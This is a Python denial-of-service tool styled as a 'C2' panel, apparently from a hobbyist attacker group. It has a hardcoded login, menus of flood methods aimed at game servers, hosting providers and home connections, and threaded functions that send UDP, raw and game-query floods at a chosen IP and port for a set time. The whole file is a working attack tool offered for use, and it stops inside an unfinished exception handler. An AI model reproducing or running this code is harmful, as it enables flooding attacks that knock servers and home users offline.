#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#C2 Tools By Z1
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

username = str(input("\033[31m[\033[35mZieLx\033[31m@Eye$]\033[35m Username \033[36m$ \033[31m"))
time.sleep(1.5)
password = str(input("\033[31m[\033[35mZieLx\033[31m@Eye$]\033[35m Password \033[36m$ \033[31m"))
time.sleep(1.5)
os.system("cls")
print("\033[35m[Connecting To Tools] \033[31m[\033[36m•••\033[31m]")
time.sleep(1.5)
os.system("cls")
print("\033[35m[Connecting To Tools] \033[31m[\033[36m••\033[31m]")
time.sleep(1.5)
os.system("cls")
print("\033[35m[Connecting To Tools] \033[31m[\033[36m•\033[31m]")
time.sleep(1.5)
os.system("cls")
print("\033[35m[Connecting To Tools] \033[31m[\033[36m••\033[31m]")
time.sleep(1.5)
os.system("cls")
print("\033[35m[Connecting To Tools] \033[31m[\033[36m•••\033[31m]")
time.sleep(1.5)
os.system("cls")
if username == "Z1" and password == "#eyes":
	print("\033[35m[\033[31mLogin Authorized\033[35m]")
	time.sleep(3)
else:
		print("\033[35m[\033[31mWrong Username/Password!!!\033[35m]")
		time.sleep(99999999)
os.system("cls")
nicknm = "ZieLx"

about = """
\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[31mAbout Tools! \033[36m---  \033[35m╚═════════╗
\033[35m║ \033[31mDc     \033[36m> \033[31mZ1#7872                 \033[35m║
\033[35m║ \033[31mYt     \033[36m> \033[31mZiel ?                  \033[35m║
\033[35m║ \033[31mTeam   \033[36m> \033[31mEyes Team               \033[35m║
\033[35m╚══════════════════════════════════╝
"""
methods = """
\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[31mMethods List! \033[36m--- \033[35m╚═════════╗
\033[35m║ \033[31mgen3   \033[36m> \033[31mShows Gen3 Methods!     \033[35m║
\033[35m║ \033[31mgen2   \033[36m> \033[31mShows Gen2 Methods!     \033[35m║
\033[35m║ \033[31mlayer4 \033[36m> \033[31mShows Layer 4 Methods!  \033[35m║
\033[35m║ \033[31mlayer7 \033[36m> \033[31mShows Layer 7 Methods!  \033[35m║
\033[35m║ \033[31mprivate\033[36m> \033[31mShows Private Methods!  \033[35m║
\033[35m║ \033[31mraw    \033[36m> \033[31mShows Raw Methods!      \033[35m║
\033[35m║ \033[31mabout  \033[36m> \033[31mShows More Methods!     \033[35m║
\033[35m╚══════════════════════════════════╝
"""

raw = """
\033[35m                                 ╔═╗╦╔═\033[31m╗╦  ═╗ ╦
\033[35m                                 ╔═╝║║╣\033[31m ║  ╔╩╦╝
\033[35m                                 ╚═╝╩╚═\033[31m╝╩═╝╩ ╚═
\033[35m                             SUBSCRIBE M\033[31mY YOUTUBE  
      
\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[31mudpraw \033[36m- \033[31mRaw UDP Flood \033[35m  ║ \033[31mhexraw \033[36m- \033[31mRaw HEX Flood \033[35m    ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[31mtcpraw \033[36m- \033[31mRaw TCP Flood \033[35m║ ║ \033[31mvseraw \033[36m- \033[31mRaw VSE Flood \033[35m  ║
\033[35m             ║ \033[31mstdraw \033[36m- \033[31mRaw STD Flood \033[35m║ ║ \033[31msynraw \033[36m- \033[31mRaw SYN Flood \033[35m  ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[31mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[35m                                 ╔═╗╦╔═\033[31m╗╦  ═╗ ╦
\033[35m                                 ╔═╝║║╣\033[31m ║  ╔╩╦╝
\033[35m                                 ╚═╝╩╚═\033[31m╝╩═╝╩ ╚═
\033[35m                             SUBSCRIBE M\033[31mY YOUTUBE  

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[31movhslav \033[36m- \033[31mSlavic Flood \033[35m  ║ \033[31miotv1 \033[36m- \033[31mCustom Method!  \033[35m   ║
\033[35m            ║ \033[31mcpukill \033[36m- \033[31mCpu Rape Flood\033[35m ║ \033[31miotv2 \033[36m- \033[31mCustom Method!  \033[35m   ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[31mfivemkill \033[36m- \033[31mFivem Kill \033[35m║ ║ \033[31miotv3 \033[36m-\033[31m Custom Method!  \033[35m ║
\033[35m             ║ \033[31micmprape  \033[36m- \033[31mICMP Rape  \033[35m║ ║ \033[31mssdp  \033[36m-\033[31m Amped SSDP      \033[35m ║
\033[35m             ║ \033[31mtcprape \033[36m- \033[31mRaping TCP   \033[35m║ ║ \033[31marknull \033[36m- \033[31mArk Method    \033[35m ║
\033[35m             ║ \033[31mnforape \033[36m- \033[31mNfo Method   \033[35m║ ║ \033[31m2kdown  \033[36m- \033[31mNBA 2K Flood  \033[35m ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[31mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[35m                                 ╔═╗╦╔═\033[31m╗╦  ═╗ ╦
\033[35m                                 ╔═╝║║╣\033[31m ║  ╔╩╦╝
\033[35m                                 ╚═╝╩╚═\033[31m╝╩═╝╩ ╚═
\033[35m                             SUBSCRIBE M\033[31mY YOUTUBE  

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[31mhomeslap    \033[36m. \033[31mr6kill     \033[35m║ \033[31mfivemtcp  \033[36m. \033[31mnfokill       \033[35m ║
\033[35m            ║ \033[31mark255      \033[36m. \033[31marklift    \033[35m║ \033[31mhotspot   \033[36m. \033[31mvpn           \033[35m ║
\033[35m            ║ \033[31mhydrakiller \033[36m. \033[31markdown    \033[35m║ \033[31mnfonull   \033[36m. \033[31mdhcp          \033[35m ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[31movhnat    \033[36m. \033[31movhamp     \033[35m║ ║ \033[31movhwdz    \033[36m. \033[31movhx         \033[35m║
\033[35m             ║ \033[31mnfodrop   \033[36m. \033[31mnfocrush   \033[35m║ ║ \033[31mnfodown   \033[36m. \033[31mnfox         \033[35m║
\033[35m             ║ \033[31mudprape   \033[36m. \033[31mudprapev3  \033[35m║ ║ \033[31mfortnite  \033[36m. \033[31mfortnitev2   \033[35m║
\033[35m             ║ \033[31mudprapev2 \033[36m. \033[31mudpbypass  \033[35m║ ║ \033[31mgreeth    \033[36m. \033[31mtelnet       \033[35m║
\033[35m             ║ \033[31mfivemv2   \033[36m. \033[31mr6drop     \033[35m║ ║\033[31m r6freeze  \033[36m. \033[31mkillall      \033[35m║
\033[35m             ║ \033[31m2krape    \033[36m. \033[31mfallguys   \033[35m║ ║ \033[31movhdown   \033[36m. \033[31movhkill      \033[35m║
\033[35m             ║ \033[31mfivemrape \033[36m. \033[31mfivemdown  \033[35m║ ║ \033[31mfivemv1   \033[36m. \033[31mfivemslump   \033[35m║
\033[35m             ║ \033[31mkillallv2 \033[36m. \033[31mkillallv3  \033[35m║ ║ \033[31mpowerslap \033[36m. \033[31mrapecom      \033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[31mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\033[35m
\033[35m                                 ╔═╗╦╔═\033[31m╗╦  ═╗ ╦
\033[35m                                 ╔═╝║║╣\033[31m ║  ╔╩╦╝
\033[35m                                 ╚═╝╩╚═\033[31m╝╩═╝╩ ╚═
\033[35m                             SUBSCRIBE M\033[31mY YOUTUBE  

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║  \033[31mudp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[31mvse \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ║  \033[31mtcp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[31mack \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[31mstd \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[31mdns \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║ \033[31msyn \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[31movh \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║\033[36m- - - - - - - \033[93mhomerape \033[31m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[31mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\033[35m                                 ╔═╗╦╔═\033[31m╗╦  ═╗ ╦
\033[35m                                 ╔═╝║║╣\033[31m ║  ╔╩╦╝
\033[35m                                 ╚═╝╩╚═\033[31m╝╩═╝╩ ╚═
\033[35m                             SUBSCRIBE M\033[31mY YOUTUBE  

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[31m- - - - - - - Eye$  C2 By \033[36m@ZieLx \033[31m- - - - - - - \033[35m║
\033[35m                ║\033[31m- - - Type \033[36mmethod\033[31m to see the Help Menu - - - - \033[35m║
\033[35m                ╚═══════════════════════════════════════════════╝


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[31m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
#bawaan 32500,4150
#kaltebg tembus	23100,32100
	while True:
		bots = (random.randint(750,900))
		sys.stdout.write("\x1b]2;Eyes. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[31m[\033[35m{}\033[31m@Eye$]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ('cls')
			print (banner)
			main()
		if sinput == "cls":
			os.system ('cls')
			print (banner)
			main()
		elif sinput == "?":
			os.system ('cls')
			print (banner)
			main()
		elif sinput == "about":
			os.system('cls')
			print (about)
			main()
		elif sinput == "layer4":
			os.system ('cls')
			print (layer4)
			main()
		elif sinput == "method":
			os.system ('cls')
			print (methods)
			main()
		elif sinput == "methods":
			os.system ('cls')
			print (methods)
			main()
		elif sinput == "private":
			os.system ('cls')
			print (private)
			main()
		elif sinput == "gen3":
			os.system ('cls')
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ('cls')
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ('cls')
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
